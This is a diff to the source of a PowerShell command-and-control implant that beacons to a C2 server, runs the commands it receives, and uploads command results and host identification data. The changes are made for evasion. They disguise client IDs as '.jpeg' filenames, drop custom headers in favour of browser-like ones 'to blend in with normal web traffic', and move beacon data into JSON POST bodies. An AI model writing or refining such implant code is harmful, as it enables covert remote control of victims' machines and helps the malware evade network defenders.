@@ -129,6 +129,15 @@ function Update-EncryptionKey {
     }
 }
 
+# Function to generate a new client ID using the specified format
+function New-ClientId {
+    # Generate a random 5-character string using uppercase letters
+    $random = -join ((65..90) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+    # Append "-img.jpeg" to make it look like an image file
+    $clientId = "$random-img.jpeg"
+    return $clientId
+}
+
 # Function to gather simplified system identification information
 function Get-SystemIdentification {
     # Gather only hostname and IP
@@ -141,25 +150,14 @@ function Get-SystemIdentification {
         }
     }
     
-    # Generate a unique client identifier (will persist across sessions)
+    # Generate a unique client identifier or use existing one
     if ($global:clientId) {
         # Use existing client ID if we have one
         $systemInfo.ClientId = $global:clientId
     } else {
-        # Generate a new unique identifier based on hostname
-        $machineId = [Guid]::NewGuid().ToString()
-        
-        # Create a stable client ID using machine-specific information
-        $computerName = $systemInfo.Hostname
-        
-        # Hash it for a stable ID
-        $shaHash = [System.Security.Cryptography.SHA256]::Create()
-        $hashBytes = $shaHash.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($computerName))
-        $machineId = [System.BitConverter]::ToString($hashBytes).Replace("-", "").Substring(0, 32)
-        
-        # Store and return the client ID
-        $global:clientId = $machineId
-        $systemInfo.ClientId = $machineId
+        # Generate a new client ID
+        $global:clientId = New-ClientId
+        $systemInfo.ClientId = $global:clientId
     }
     
     # Add rotation information if enabled
@@ -200,6 +198,8 @@ function Process-Commands {
                 $resultObj = @{
                     timestamp = $timestamp
                     result = $result
+                    client_id = $global:clientId
+                    system_info = Get-SystemIdentification
                 }
                 
                 # First prepare the JSON
@@ -208,13 +208,7 @@ function Process-Commands {
                 # Create a web client for result submission
                 $resultClient = New-Object System.Net.WebClient
                 
-                # Get fresh system info after key update
-                $systemInfo = Get-SystemIdentification
-                $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
-                $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
-                
-                # Add essential headers
-                $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
+                # Add only standard headers for web browsing (no custom headers)
                 $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                 $resultClient.Headers.Add("Content-Type", "application/json")
     
@@ -229,17 +223,19 @@ function Process-Commands {
                         $resultUrl = "http://$serverAddress$commandResultPath"
                         Write-Host "Sending key issuance result to $resultUrl (attempt $($currentRetry+1))"
                         
-                        # First try with minimal encryption
+                        # First try with unencrypted data
                         if ($currentRetry -eq 0) {
-                            # On first attempt, send with minimal headers
-                            $resultClient.Headers["X-System-Info"] = $systemInfo  # Send unencrypted system info
-                            $resultClient.UploadString($resultUrl, $resultJson)  # Send unencrypted result
+                            $resultClient.UploadString($resultUrl, $resultJson)
                         }
                         # On subsequent retries, try with encryption
                         else {
-                            $resultClient.Headers["X-System-Info"] = $encryptedSystemInfo
                             $encryptedResult = Encrypt-Data -PlainText $resultJson
-                            $resultClient.UploadString($resultUrl, $encryptedResult)
+                            $encryptedObj = @{
+                                data = $encryptedResult
+                                client_id = $global:clientId
+                            }
+                            $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
+                            $resultClient.UploadString($resultUrl, $encryptedJson)
                         }
                         
                         $sendSuccess = $true
@@ -296,6 +292,7 @@ function Process-Commands {
             $resultObj = @{
                 timestamp = $timestamp
                 result = $result
+                client_id = $global:clientId
             }
             
             $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
@@ -306,21 +303,21 @@ function Process-Commands {
             $resultUrl = "http://$serverAddress$cmdResultPath"
             
             $resultClient = New-Object System.Net.WebClient
-            $systemInfo = Get-SystemIdentification
-            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
-            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
             
-            $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
-            $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
-            if ($global:pathRotationEnabled) {
-                $resultClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
-            }
+            # Add only standard headers, no custom headers
             $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $resultClient.Headers.Add("Content-Type", "application/json")
             
+            # Create payload with encrypted data and client ID in plain text
+            $payload = @{
+                data = $encryptedResult
+                client_id = $global:clientId
+            }
+            $payloadJson = ConvertTo-Json -InputObject $payload -Compress
+            
             Write-Host "Sending command result to $resultUrl"
             try {
-                $resultClient.UploadString($resultUrl, $encryptedResult)
+                $resultClient.UploadString($resultUrl, $payloadJson)
                 Write-Host "Command result sent successfully"
             }
             catch {
@@ -332,6 +329,7 @@ function Process-Commands {
             $resultObj = @{
                 timestamp = $timestamp
                 result = "Error executing command: $_"
+                client_id = $global:clientId
             }
             
             $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
@@ -342,21 +340,21 @@ function Process-Commands {
             $resultUrl = "http://$serverAddress$cmdResultPath"
             
             $resultClient = New-Object System.Net.WebClient
-            $systemInfo = Get-SystemIdentification
-            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
-            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
             
-            $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
-            $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
-            if ($global:pathRotationEnabled) {
-                $resultClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
-            }
+            # Add only standard headers, no custom headers
             $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $resultClient.Headers.Add("Content-Type", "application/json")
             
+            # Create payload with encrypted data and client ID in plain text
+            $payload = @{
+                data = $encryptedResult
+                client_id = $global:clientId
+            }
+            $payloadJson = ConvertTo-Json -InputObject $payload -Compress
+            
             Write-Host "Sending error result to $resultUrl"
             try {
-                $resultClient.UploadString($resultUrl, $encryptedResult)
+                $resultClient.UploadString($resultUrl, $payloadJson)
                 Write-Host "Error result sent successfully"
             }
             catch {
@@ -378,22 +376,17 @@ function Check-PathRotation {
     }
 }
 
-# Function to handle server response headers and update rotation info
-function Process-ServerResponseHeaders {
-    param($WebClient)
+# Function to handle server response data and update rotation info
+function Process-ServerResponse {
+    param($ResponseData)
     
-    # Check for client ID from server
-    $serverClientId = $WebClient.ResponseHeaders["X-Client-ID"]
-    if ($serverClientId) {
-        # Store the server-assigned ID
-        $global:clientId = $serverClientId
-        Write-Host "Server assigned client ID: $serverClientId"
-    }
+    # Extract information from response
+    $serverData = $ResponseData
     
-    # Check for rotation information in headers
-    if ($global:pathRotationEnabled) {
-        $rotationId = $WebClient.ResponseHeaders["X-Rotation-ID"]
-        $nextRotation = $WebClient.ResponseHeaders["X-Next-Rotation"]
+    # Check for rotation information
+    if ($global:pathRotationEnabled -and $serverData.rotation_info) {
+        $rotationId = $serverData.rotation_info.current_rotation_id
+        $nextRotation = $serverData.rotation_info.next_rotation_time
         
         if ($rotationId -and [int]$rotationId -ne $global:currentRotationId) {
             # Server has newer rotation, we need to get paths
@@ -407,16 +400,16 @@ function Process-ServerResponseHeaders {
         }
     }
     
-    # Check for key operation headers
-    if ($WebClient.ResponseHeaders["X-First-Contact"] -eq "true") {
+    # Check for key operation status
+    if ($serverData.first_contact -eq $true) {
         Write-Host "First contact with server established - key exchange in progress"
     }
     
-    if ($WebClient.ResponseHeaders["X-Key-Issuance"] -eq "true") {
+    if ($serverData.key_issuance -eq $true) {
         Write-Host "Key issuance indicated in response"
     }
     
-    if ($WebClient.ResponseHeaders["X-Key-Rotation"] -eq "true") {
+    if ($serverData.key_rotation -eq $true) {
         Write-Host "Key rotation indicated in response"
     }
 }
@@ -480,12 +473,16 @@ function Start-AgentLoop {
     if ($loadedClientId) {
         $global:clientId = $loadedClientId
         Write-Host "Loaded client ID from persistent storage: $global:clientId"
+    } else {
+        # Generate a new client ID
+        $global:clientId = New-ClientId
+        Write-Host "Generated new client ID: $global:clientId"
     }
     
     # Get system information for identification
     $systemInfo = Get-SystemIdentification
     
-    # Extract client ID from system info
+    # Extract client ID and hostname from system info
     $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
     $clientId = $systemInfoObj.ClientId
     $hostname = $systemInfoObj.Hostname
@@ -509,24 +506,11 @@ function Start-AgentLoop {
             # Create web client for C2 communication
             $webClient = New-Object System.Net.WebClient
             
-            # Add system info - encrypted if we have a key, otherwise plaintext
-            $systemInfoRaw = Get-SystemIdentification
-            $encryptedSystemInfo = if ($null -eq $global:encryptionKey) { $systemInfoRaw } else { Encrypt-Data -PlainText $systemInfoRaw }
-            $webClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
-            
-            # Add client ID
-            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfoRaw
-            $webClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
-            
-            # Add current rotation ID if path rotation is enabled
-            if ($global:pathRotationEnabled) {
-                $webClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
-            }
-            
-            # Add legitimate-looking headers to blend in with normal web traffic
+            # Add only standard headers to blend in with normal web traffic - no custom headers
             $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
             $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
+            $webClient.Headers.Add("Content-Type", "application/json")
             
             # Get current beacon path based on rotation status
             $currentBeaconPath = if ($global:pathRotationEnabled -and -not $usingFallbackPaths) { 
@@ -536,12 +520,25 @@ function Start-AgentLoop {
             }
             $beaconUrl = "http://$serverAddress$currentBeaconPath"
             
+            # Prepare the system info data
+            $systemInfoRaw = Get-SystemIdentification
+            $encryptedSystemInfo = if ($null -eq $global:encryptionKey) { $systemInfoRaw } else { Encrypt-Data -PlainText $systemInfoRaw }
+            
+            # Prepare the beacon payload - include client ID in plain text
+            $beaconPayload = @{
+                client_id = $global:clientId
+                data = $encryptedSystemInfo
+                rotation_id = if ($global:pathRotationEnabled) { $global:currentRotationId } else { 0 }
+            }
+            $beaconJson = ConvertTo-Json -InputObject $beaconPayload -Compress
+            
             # Beacon to the C2 server
             Write-Host "[$hostname] Beaconing to $beaconUrl"
-            $response = $webClient.DownloadString($beaconUrl)
+            $response = $webClient.UploadString($beaconUrl, "POST", $beaconJson)
             
-            # Process response headers for path rotation updates and key operations
-            Process-ServerResponseHeaders -WebClient $webClient
+            # Process response data
+            $responseObject = ConvertFrom-Json -InputObject $response
+            Process-ServerResponse -ResponseData $responseObject
             
             # Reset failure counter on successful connection
             $consecutiveFailures = 0
@@ -553,34 +550,31 @@ function Start-AgentLoop {
                 $loadedClientId = $global:clientId
             }
             
-            # Process response if not empty
-            if ($response.Length -gt 0) {
-                # Check for special header that indicates first contact/key issuance
-                $isFirstContact = $webClient.ResponseHeaders["X-First-Contact"] -eq "true"
+            # Process response if it contains commands
+            if ($responseObject.commands -and $responseObject.commands.Length -gt 0) {
+                # Check for special flag that indicates first contact/key issuance
+                $isFirstContact = $responseObject.first_contact -eq $true
                 
-                # If it's first contact, the response is not encrypted
+                # If it's first contact, the commands are not encrypted
                 if ($isFirstContact) {
-                    # Parse directly as JSON
-                    try {
-                        $commands = ConvertFrom-Json -InputObject $response
-                        # Process commands will handle key issuance
-                        Process-Commands -Commands $commands
-                    }
-                    catch {
-                        Write-Host "Error parsing first contact response: $_"
-                    }
+                    # Process commands directly
+                    Process-Commands -Commands $responseObject.commands
                 }
                 else {
-                    # For established sessions, decrypt the response
-                    $decryptedResponse = Decrypt-Data -EncryptedBase64 $response
-                    
-                    # Parse the decrypted response
-                    try {
-                        $commands = ConvertFrom-Json -InputObject $decryptedResponse
-                        Process-Commands -Commands $commands
+                    # For established sessions, decrypt the commands if they're encrypted
+                    if ($responseObject.encrypted -eq $true) {
+                        $decryptedResponse = Decrypt-Data -EncryptedBase64 $responseObject.commands
+                        try {
+                            $commands = ConvertFrom-Json -InputObject $decryptedResponse
+                            Process-Commands -Commands $commands
+                        }
+                        catch {
+                            Write-Host "Error parsing decrypted response: $_"
+                        }
                     }
-                    catch {
-                        Write-Host "Error parsing decrypted response: $_"
+                    else {
+                        # Handle unencrypted commands
+                        Process-Commands -Commands $responseObject.commands
                     }
                 }
             }
